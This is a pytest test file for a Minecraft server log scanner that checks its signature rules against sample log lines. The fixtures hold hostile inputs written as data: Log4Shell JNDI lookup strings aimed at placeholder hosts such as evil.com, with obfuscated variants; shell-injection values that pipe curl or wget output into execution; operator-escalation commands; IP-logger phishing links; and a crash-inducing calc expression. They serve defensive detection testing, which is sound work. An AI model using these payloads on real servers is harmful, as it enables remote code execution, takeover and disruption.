import json

import pytest

from mclogscan.parser import parse_lines
from mclogscan.signatures import RuleError, load_rules, scan_signatures

RULES = load_rules()
RULE_IDS = {r.id for r in RULES}

CHAT = "[18:00:00] [Async Chat Thread - #0/INFO]: <Mallory> {}"
CMD = "[18:00:00] [Server thread/INFO]: Mallory issued server command: {}"
SERVER = "[18:00:00] [Server thread/INFO]: {}"

# (rule id, log line that SHOULD trigger it)
TRUE_POSITIVES = [
    ("MC-L4S-001", CHAT.format("${jndi:ldap://1.2.3.4:1389/a}")),
    ("MC-L4S-001", CHAT.format("${JNDI:rmi://evil.com/x}")),
    ("MC-L4S-002", CHAT.format("${${lower:j}ndi:ldap://evil/a}")),
    ("MC-L4S-002", CHAT.format("${${::-j}${::-n}${::-d}${::-i}:ldap://evil/a}")),
    ("MC-L4S-002", CHAT.format("${${env:BARFOO:-j}ndi:ldap://evil/a}")),
    ("MC-PRIV-001", CMD.format("/op Mallory")),
    ("MC-PRIV-001", CMD.format("/minecraft:op Mallory")),
    ("MC-PRIV-001", CMD.format("/lp user Mallory permission set *")),
    ("MC-ADMIN-001", CMD.format("/whitelist off")),
    ("MC-ADMIN-001", CMD.format("/gamerule logAdminCommands false")),
    ("MC-ADMIN-001", CMD.format("/pardon Griefer")),
    ("MC-GRIEF-001", CMD.format("/kill @e")),
    ("MC-GRIEF-001", CMD.format("//set tnt")),
    ("MC-CRASH-001", CMD.format("//calc for(i=0;i<256;i++){ln(pi)}")),
    ("MC-CRASH-002", SERVER.format("io.netty.handler.codec.DecoderException: Badly compressed packet")),
    ("MC-CRASH-002", SERVER.format("Payload may not be larger than 32767 bytes")),
    ("MC-CMDI-001", CMD.format("/nick a; curl http://x/y.sh | bash")),
    ("MC-CMDI-001", CHAT.format("$(whoami)")),
    ("MC-CMDI-001", CMD.format("/msg a && wget http://x/m")),
    ("MC-BACKDOOR-001", CHAT.format("#op Mallory")),
    ("MC-BACKDOOR-001", CHAT.format(".console stop")),
    ("MC-BACKDOOR-001", CHAT.format("!forceop")),
    ("MC-PHISH-001", CHAT.format("free vbucks https://grabify.link/XYZ")),
    ("MC-PHISH-001", CHAT.format("see iplogger.org/2abc")),
    ("MC-RECON-001", CMD.format("/plugins")),
    ("MC-RECON-001", CMD.format("/bukkit:ver")),
    ("MC-HACK-001", SERVER.format("Mallory moved too quickly! 10.0,0.0,5.0")),
    ("MC-AUTH-001", SERVER.format("Mallory (/1.2.3.4:5) lost connection: Failed to verify username!")),
    ("MC-INJ-001", CHAT.format("hidden\x1b[2Ktext")),
]

# Normal activity that must NOT trigger anything (false-positive checks).
TRUE_NEGATIVES = [
    CHAT.format("my ping is ${ping} lol"),
    CHAT.format("the op said we can build here"),
    CHAT.format("I love opening chests"),
    CHAT.format("check out my build, it's on the discord"),
    CHAT.format("that was a big bash, lol"),
    CHAT.format("#1 player on the server!"),
    CHAT.format("...ok"),
    CMD.format("/home"),
    CMD.format("/tpa Steve"),
    CMD.format("/operator_help"),
    CMD.format("/kill"),
    CMD.format("/msg Steve meet at spawn; bring food"),
    CMD.format("/playtime"),
    SERVER.format("Steve joined the game"),
    SERVER.format("Done (4.871s)! For help, type \"help\""),
]


def matching_ids(line):
    return {f.rule_id for f in scan_signatures(parse_lines([line]), RULES)}


def test_every_rule_has_a_positive_test():
    tested = {rule_id for rule_id, _ in TRUE_POSITIVES}
    assert tested == RULE_IDS, f"untested rules: {RULE_IDS - tested}"


@pytest.mark.parametrize("rule_id,line", TRUE_POSITIVES)
def test_rule_detects_attack(rule_id, line):
    assert rule_id in matching_ids(line)


@pytest.mark.parametrize("line", TRUE_NEGATIVES)
def test_benign_line_not_flagged(line):
    assert matching_ids(line) == set()


def test_event_filter_restricts_rule():
    # "/op" in *chat* is someone talking about a command, not running it.
    assert "MC-PRIV-001" not in matching_ids(CHAT.format("/op Mallory"))


def test_finding_carries_context():
    entries = parse_lines(["[18:05:15] [Async Chat Thread - #1/INFO]: <Eve> ${jndi:ldap://x/a}"])
    [finding] = list(scan_signatures(entries, RULES))
    assert finding.player == "Eve"
    assert finding.severity == "critical"
    assert "CVE-2021-44228" in finding.references
    assert finding.line_no == 1


@pytest.mark.parametrize(
    "rules,error",
    [
        ({"id": "X"}, "must contain a JSON list"),
        ([{"id": "X", "name": "n", "severity": "high"}], "missing pattern"),
        ([{"id": "X", "name": "n", "severity": "scary", "pattern": "a"}], "unknown severity"),
        ([{"id": "X", "name": "n", "severity": "low", "pattern": "("}], "invalid regex"),
        ([{"id": "X", "name": "n", "severity": "low", "pattern": "a", "fields": ["nope"]}], "unknown field"),
        ([{"id": "X", "name": "n", "severity": "low", "pattern": "a"}] * 2, "duplicate rule id"),
    ],
)
def test_invalid_rule_files_rejected(tmp_path, rules, error):
    path = tmp_path / "rules.json"
    path.write_text(json.dumps(rules))
    with pytest.raises(RuleError, match=error):
        load_rules(path)


def test_custom_rule_file(tmp_path):
    path = tmp_path / "rules.json"
    path.write_text(json.dumps([
        {"id": "CUSTOM-1", "name": "Bad word", "severity": "low", "pattern": "creeper", "fields": ["content"]}
    ]))
    rules = load_rules(path)
    findings = list(scan_signatures(parse_lines([CHAT.format("aw man, CREEPER")]), rules))
    assert [f.rule_id for f in findings] == ["CUSTOM-1"]
